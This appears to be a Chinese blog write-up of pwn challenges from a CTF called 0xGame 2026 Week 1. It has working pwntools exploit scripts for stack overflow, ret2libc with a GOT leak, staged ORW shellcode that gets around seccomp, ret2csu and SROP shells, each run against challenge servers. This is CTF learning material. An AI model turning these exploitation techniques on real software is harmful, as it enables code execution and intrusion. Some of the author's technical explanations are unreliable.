+++
date = '2026-10-12T11:55:55+08:00'
draft = false
title = '0xGame 2026 Week 1'
tags = ["pwn","Buffer Overflow","ret2text","ret2libc","ret2csu","SROP"]
categories = ["CTF"]
+++


## 1.！？数学基础？！

本题考的跟pwn没什么关系。接下来给表弟上点震撼。

没什么好说的，就是用一个自动化脚本达成读取，处理，计算，提交四个部分，主要用到正则表达式提取字符串、Unicode 视觉欺骗字符（全角 / 特殊符号）

```python
from pwn import *
import re

io = remote("nc1.ctfplus.cn", 36360)

for _ in range(100):
    io.recvuntil(b"calculate: ")
    raw = io.recvuntil(b" = ?").decode().strip()
    print(f"原始式子：{repr(raw)}")
    
    match = re.search(r"(\d+)\s*([^0-9\s]+)\s*(\d+)", raw)
    a = int(match.group(1))
    op = match.group(2)
    op_code = ord(op)
    b = int(match.group(3))
    print(f"捕获运算符: {repr(op)} ord={op_code}")  
    ans = 0
    if op_code == 120:        # x 乘法
        ans = a * b
    elif op_code == 43 or op_code == 65291: # 半角+ 和全角＋
        ans = a + b
    elif op_code == 247:      # ÷ 除法
        ans = a // b
    elif op_code == 19968:    # — 长破折号 减法
        ans = a - b
    else:
        print("未知运算符！")
        ans = 0    
    io.sendline(str(ans).encode())
    print(f"{a} {op} {b} = {ans}\n")

flag = io.recvall().decode()
print("[+] FLAG =>", flag)
io.close()


```



## 2.奇妙杂货铺

界面提示：试着把购买的规则 “倒” 过来玩，也许财富不仅不用花，还会自己流进你的钱包。

猜测无符号整数下溢漏洞

直接在数字前面加个负号给自己加钱（还有这好事）

## 3.亦步亦趋

先运行一下，看样子考的是栈溢出用`deadbeef`去覆盖`magic`,算一下`0x4cc-0x4b0`,转成十进制是`28`，先写level1:

```python
from pwn import *

io = process('./pwn')

io.recvuntil(b'Now input your Payload:')

payload = b'a'*28 + p64(0xdeadbeef)

io.sendline(payload)

io.interactive()
```

level2告诉我win函数的地址，那依然是栈溢出跳到win函数执行system('/bin/sh'),那我就直接开写脚本了

一眼缓冲区32，rbp再占8个字节，那就是40个垃圾字节.构造payload2时其实遇到一个问题，就是题目给了win的地址，我一开始时直接写上去的，但是会报错，我以为我抄错了，于是我把第一个脚本又运行了两次，发现每次win的地址都不一样，那就是开PIE了（吃了忘看checksec的亏）。那我的思路就转变成用脚本接收地址了，并且为了看到底拿没拿到地址，我加了`print`去打

```python
from pwn import *

io = process('./pwn')

io.recvuntil(b'Now input your Payload:')
payload1 = b'a'*28 + p64(0xdeadbeef)
io.send(payload1)

io.recvuntil(b'I hane prtpared backdoor for you.'win',it's addr about:")

win_addr = int(io.recvline(),16.)
print(win_addr)

ret_offset = 0x101a
win_offset = 0x1209
base = win_addr - win_offset
ret_addr = base + ret_offset

io.recvuntil(b'Now input your Payload:')
payload2 =b'a'*40+p64(ret_addr) + p64(win_addr)
io.sendline(payload2)

io.interactive()
```

## 4.两次回响

main函数汇编

```c
void *buf;
init(argc, argv, envp);
buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL); // 分配 RWX (可读可写可执行) 内存
puts("What do you want to say ?");
read(0, buf, 9uLL); // 只能读入 9 个字节
((void (*)(void))buf)(); // 跳转到 buf 执行
```

题目极其变态，只允许输入 9 个字节。9 个字节连 `execve("/bin/sh")` 的零头都不够。既然一次写不下完整的攻击代码，我们就分步走。先输入 9 字节的 Stage 1（第一级加载器），这段代码的目的不是直接去拿 flag，而是**触发一次新的 `read` 系统调用**，把后面更大的 **Stage 2** 读进内存并执行

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# p = process('./pwn') 
p = remote('nc1.ctfplus.cn', 37539)
filename = b'flag' 
# 动态生成 openat 的 shellcode
def make_openat_shellcode(fname):
    # 补齐空字节
    fname = fname + b'\x00'
    if len(fname) % 8 != 0:
        fname = fname.ljust((len(fname) // 8 + 1) * 8, b'\x00')   
    asm_code = "xor eax, eax\n"  # 清空 rax
    # 从后往前按 8 字节压栈
    for i in range(len(fname), 0, -8):
        chunk = fname[i-8:i]
        asm_code += f"mov rax, {hex(u64(chunk))}\npush rax\n"  
    asm_code += """
        mov rsi, rsp            /* rsi = 文件名地址 */
        mov edi, -100           /* rdi = AT_FDCWD (-100) */
        xor edx, edx            /* rdx = 0 */
        push 257
        pop rax                 /* 系统调用号 257 (openat) */
        syscall
    """
    return asm_code
p.recvuntil(b'What do you want to say ?')
# Stage 1 (9字节)：读取 32 字节 
stage1 = b'\xf3\x0f\x1e\xfa\x6a\x20\x5a\x0f\x05'
p.send(stage1)
# Stage 2 (32字节)：重置 rax=0，设置 rdx=0x100，触发第二次 read
stage2 = b'\x90' * 9 + b'\x31\xc0\x31\xd2\xb6\x10\x0f\x05' + b'\x90' * 15
p.send(stage2)
# Stage 3 (ORW Shellcode)：读取文件
# 获取 openat 部分汇编
openat_asm = make_openat_shellcode(filename)
shellcode_asm = openat_asm + """
    /* 2. read(fd, rsp, 0x100) */
    mov rdi, rax            /* 将 openat 返回的文件描述符放入 rdi */
    xor eax, eax            /* 系统调用号 0 (read) */
    xor edx, edx
    mov dh, 1               /* rdx = 0x100 */
    mov rsi, rsp            /* 读到栈上 */
    syscall

    /* 3. write(1, rsp, 0x100) */
    push 1
    pop rdi                 /* rdi = 1 (stdout) */
    push 1
    pop rax                 /* 系统调用号 1 (write) */
    xor edx, edx
    mov dh, 1               /* rdx = 0x100 */
    mov rsi, rsp
    syscall
"""
stage3 = b'\x90' * 17 + asm(shellcode_asm)
p.send(stage3)
# 关闭写端，让阻塞的第二次 read 返回
p.shutdown('send')
# 接收 Flag
print("\n[+] 得到结果:")
result = p.recvall()
print(result.decode(errors='ignore'))
```

踩坑点：

1.在 `main` 函数的汇编中：

```asm
mov rdx, [rbp+var_8] ; rdx = buf 的内存地址（例如 0x7f...）
mov eax, 0           ; rax = 0 (read)
call rdx             ; 跳过去执行
```

当我们第一次执行 `syscall`（read）时，`rdx` 是一个极大的内存地址。内核发现我们要读取这么多字节，直接判定超出范围，返回 `-EFAULT`。于是我们用了 `push 0x20; pop rdx`（3字节），强行把 `rdx` 覆盖成了精确的 32。

2.第一次 `read` 成功后，`rax` 不再是 0，而是变成了**实际读取的字节数（比如 32）**。我们在 Stage 2 写下 `xor edx, edx; mov dh, 0x10; syscall`。
此时 `rax = 32`，对应系统调用号 32（`dup2`）。所以系统执行了 `dup2(0, 0x100)`，不仅什么都没读进去，紧接着 RIP 滑落到空内存，直接 `SIGSEGV`，导致一直 `1B` 断连。后来我在 Stage 2 加上了 `xor eax, eax`，强制把 `rax` 归零，找回真正的 `read` 系统调用

3.我当时在本地可以弹 Shell 但远程一执行 `execve("/bin/sh")` 就立刻 `EOF` 断开。这证明了远程靶机开启了 seccomp，直接拦截了 execve。因此，攻击策略必须从获取 Shell 转变为 ORW直接读取 Flag 文件内容。

## 5.保持沉默

本题属于64 位 ret2libc，无 PIE，有栈溢出；需要先调用内置`put`函数解锁输出权限，再泄露 puts 的 GOT 地址，计算 libc 基址，最后调用 system 拿 shell

一共 3 个 Stage，分三轮向`vuln`发送 payload，每一轮 ROP 执行结束后**返回 vuln 函数**，重新触发栈溢出，实现多阶段 ROP

Stage1：调用题目内置`put`函数，解锁输出权限（题目默认关闭 stdout，必须先走这一步，否则后面 puts 泄露看不到输出）

Stage2：ROP 调用`puts@plt`，我打印了三个函数`puts，dup2和printf`，拿到 它们在远程内存里的真实地址，用来计算 libc 基址

Stage3：利用 libc 基址算出`system`和`/bin/sh`字符串地址，构造 ROP 调用`system("/bin/sh")`，拿到交互式 shell

``` python
from pwn import *
#p = process('./pwn')
p = remote('nc1.ctfplus.cn', 16840)
elf = ELF('./pwn')
rdi = 0x4011fe
rsi = 0x401200
ret = 0x40101a
put = elf.sym['put']
vuln = elf.sym['vuln']
libc = ELF("./libc6_2.35-0ubuntu3.13_amd64.so")
p.recvuntil(b'Input your payload:') #接收开场白和vuln
#context.log_level='debug'

# stage1：获取输出权限

payload1 = b'a'*40 + p64(rdi) + p64(3735928559) + p64(rsi) + p64(38183) + p64(put) + p64(vuln)
p.send(payload1)

# stage2：获取libc版本

# puts

p.recvuntil(b'Input your payload:') #接收vuln
payload2 =  b'a'*40 + p64(rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(vuln)
p.send(payload2)
p.recvline() #吃掉空行
leak_puts = p.recvline().strip(b'\n')
leak_puts = u64(leak_puts.ljust(8,b'\x00'))
print(hex(leak_puts))
'''

# dup2

p.recvuntil(b'Input your payload:') #接收vuln
payload2 =  b'a'*40 + p64(rdi) + p64(elf.got['dup2']) + p64(elf.plt['puts']) + p64(vuln)
p.send(payload2)
p.recvline() #吃掉空行
leak_puts = p.recvline().strip(b'\n')
leak_puts = u64(leak_puts.ljust(8,b'\x00'))
print(hex(leak_puts))

# printf

p.recvuntil(b'Input your payload:') #接收vuln
payload2 =  b'a'*40 + p64(rdi) + p64(elf.got['printf']) + p64(elf.plt['puts']) + p64(vuln)
p.send(payload2)
p.recvline() #吃掉空行
leak_puts = p.recvline().strip(b'\n')
leak_puts = u64(leak_puts.ljust(8,b'\x00'))
print(hex(leak_puts))
'''

# stage3 获取system和/bin/sh

p.recvuntil(b'Input your payload:') #接收vuln
base = leak_puts - libc.sym['puts']

system = base + libc.sym['system']
binsh = base + next(libc.search(b'/bin/sh\x00'))
print(hex(system),hex(binsh))
payload3 = b'a'*40 +p64(ret) + p64(rdi) + p64(binsh) + p64(system)

p.send(payload3)
p.interactive()
```





## 6.三扇门

根据提示，本题是ret2csu，在查完资料并学习后，我开始着手这道题

```python
from pwn import *

io = process('./pwn')
elf = ELF('./pwn')

write_got = elf.got['write']
win = 0x401257

# rdi = 273  r12
# rsi = 546  r13
# rdx = 819  r14
'''
.text:0000000000401386         add     rsp, 8
.text:000000000040138A         pop     rbx
.text:000000000040138B         pop     rbp
.text:000000000040138C         pop     r12
.text:000000000040138E         pop     r13
.text:0000000000401390         pop     r14
.text:0000000000401392         pop     r15
.text:0000000000401394         ret
'''
'''
.text:0000000000401370         mov     rdx, r14
.text:0000000000401373         mov     rsi, r13
.text:0000000000401376         mov     edi, r12d
.text:0000000000401379         call    ds:[__frame_dummy_init_array_entry - 403E10h][r15+rbx*8]
.text:000000000040137D         add     rbx, 1
.text:0000000000401381         cmp     rbx, rbp
.text:0000000000401384         jnz     short loc_401370
'''
# r15 = write的GOT表地址
# rbx = 0  rbp = 1
# 由于rbx=0,则, rbp需要赋值为1
csu1 = 0x40138A
csu2 = 0x401370

payload = b'a'*24 + p64(csu1)
payload += p64(0) #rbx
payload += p64(1) #rbp
payload += p64(273) #r12
payload += p64(546) #r13
payload += p64(819) #r14
payload += p64(elf.got['write']) #r15
payload += p64(csu2)
payload += p64(0)*7 + p64(win)

io.sendline(payload)

io.interactive()

```

这个逻辑其实非常简单，但不知道为什么总是EOF（加了ret也没用），于是暂时放弃这个正规的思路，赛后再研究，但是通过汇编观察发现，本题还有另一种思路：

```asm
0x401257: push rbp; mov rbp, rsp; ...  ; 参数校验
...
0x40129D: lea rdi, command ; "/bin/sh"  ; 把 /bin/sh 地址给 rdi
0x4012A4: call _system                 ; 执行 system
```

**`0x40129D` 处的指令是 `lea rdi, command ; "/bin/sh"`**。
这恰好就是 `system` 函数执行前设置参数的指令。因为 `win` 函数内部自己完成了参数设置，我们**完全可以跳过前面的 `if` 校验，也完全不需要用 `ret2csu` 去传参**。



```python
from pwn import *

# context.log_level = 'debug'
# io = process('./pwn')
io = remote('nc1.ctfplus.cn', 16840)

# 直接跳转到 lea rdi, command; call system 的位置
system_win = 0x40129D

# 偏移量 24 字节（16字节buf + 8字节rbp）
payload = b'a' * 24 + p64(system_win)

io.recvuntil(b'Welcome to ret2csu.This time , you need three keys to open the door.')
io.send(payload)
io.interactive()
```

那我只能说，不要死磕一条路，要灵活变通（得意）

## 7.大道至简

根据题目提示，这是一道SROP题

检查基本信息：静态链接，且没开 PIE，没有 Canary，栈可执行

首先看漏洞函数，显然存在栈溢出，但是没有现成的 `system("/bin/sh")`，也没有 `pop rdx; ret` 来构造 `execve(0x403033, 0, 0)`

```c
__int64 vuln()
{
  char buf[16]; // [rsp+0h] [rbp-10h]

  syscall(0, 0, buf, 0x400); // 即read(0, buf, 0x400)
  return 0;
}
```

如此看来，SROP就是最优解,进入vuln的汇编

```asm
.text:0x401033 push    rbp
.text:0x401034 mov     rbp, rsp
.text:0x401037 sub     rsp, 10h
.text:0x40103B mov     rax, 0          ; 即调用read函数呗
.text:0x401042 mov     rdi, 0          ; fd = 0
.text:0x401049 lea     rsi, [rsp+10h+buf]; buf
.text:0x40104D mov     rdx, 400h       ; count = 0x400
.text:0x401054 syscall                 ; 触发 read
.text:0x401056 xor     rax, rax        ; <--- 再次将 rax 清零
.text:0x401059 leave
.text:0x40105A retn
```

在 Linux 中，如果 `rax = 15`，那么 `syscall` 就会变成 `rt_sigreturn` 系统调用。而这个系统调用会把当前栈上的数据当成 `SigreturnFrame` 来恢复**所有寄存器**（包括 rax, rdi, rsi, rdx, rip 等）。那么如何得到 15？答案是利用 `read` 的返回值。如果 `read` 读入了 15 个字节，返回后 `rax` 就会变成 15

我们的目标是先溢出，跳回 `syscall; ret` (0x40107A，这个在汇编的gadget段有提示)。此时 `rax=0`，第二次执行 `syscall` 就会继续触发 `read`（因为寄存器 `rdi=0`, `rsi=rsp`, `rdx=0x400` 都是现成的）。再次触发 `read` 系统调用，接收我们的 `payload2`。当 `payload2`（15字节）被读入后，`rax` 变成了 15，程序执行后面的 `ret`，**恰好再次回到 `0x40107A`**。此时 `rax=15`，再次执行 `syscall`，内核就认出了这是 `rt_sigreturn` 系统调用，开始从栈上恢复我们伪造的 `SigreturnFrame`，一举劫持所有寄存器。在 `SigreturnFrame` 结构体中，我们提前设置了 `frame.rip = 0x40107A`。当 `rt_sigreturn` 恢复上下文后，`rip` 被恢复到 `0x40107A`，而 `rax` 被恢复为 59（`execve` 系统调用号），`rdi` 指向 `/bin/sh`。程序再次执行这里的 `syscall`，就完美触发了 `execve("/bin/sh", 0, 0)`，成功弹 Shell。

```python
from pwn import *
context.arch = 'amd64'
#context.log_level = 'debug'
#p = process('./pwn')
'''
gdb.attach(p,
        b *0x40107A
        c
)
'''
p = remote('nc1.ctfplus.cn', 49019)
p.recvuntil(b'Welcome to the real SROP challenge.')
syscall_ret = 0x40107A
bin_sh_addr = 0x403033
# 构造 Sigreturn Frame
frame = SigreturnFrame()
frame.rax = 59          # execve
frame.rdi = bin_sh_addr # /bin/sh
frame.rsi = bin_sh_addr+8
frame.rdx = bin_sh_addr+8
frame.rip = syscall_ret # 恢复到 rip 后执行 syscall 触发 execve
frame.rsp = 0x403040
# 第一次 Payload
payload1 = b'A' * 24
# 覆盖返回地址为 syscall; ret
payload1 += p64(syscall_ret)
payload1 += p64(syscall_ret) #控制rsp指向syscall_ret，使ret返回这儿
payload1 += bytes(frame)
p.send(payload1)
# 第二次发送 15 字节，触发 rax = 15 (rt_sigreturn)
payload2 = b'a'*15
p.send(payload2)
p.interactive()
```

有两个踩坑的点就是，第一，在较新的 Linux 内核中，`execve` 系统调用要求 `argv`（`rsi`）和 `envp`（`rdx`）必须是**合法的指针**，不能为 NULL（0）。如果传 0，内核会拒绝执行并返回错误。所以我们在 `.data` 段（`0x403033` 存放 `/bin/sh\0`）之后，找到了 `0x40303B` 这个天然的 NULL 指针，分别赋给了 `rsi` 和 `rdx`，让 `execve` 接收到一个“空的参数列表”，防止暴毙

另一个是 `frame.rsp`，我设置成了 `0x403040`。这里我踩过坑，一开始我设置为 `0x40303B`，结果一直报错 EOF。后来经过 GDB 调试排查，发现是因为 64 位 Linux 系统调用要求 `rsp` 必须 16 字节对齐，`0x40303B` 不对齐导致内核拒绝执行。所以我调整到了 `.data` 段（.bss段应该也可以，不过本题没有）所在内存页的下一个对齐地址 `0x403040`，既满足了 16 字节对齐，又保证了该地址所在的内存页是可读可写的，这样即使 `execve` 失败，程序遇到后续的 `ret` 也有合法的栈空间可以退，避免段错误崩溃。”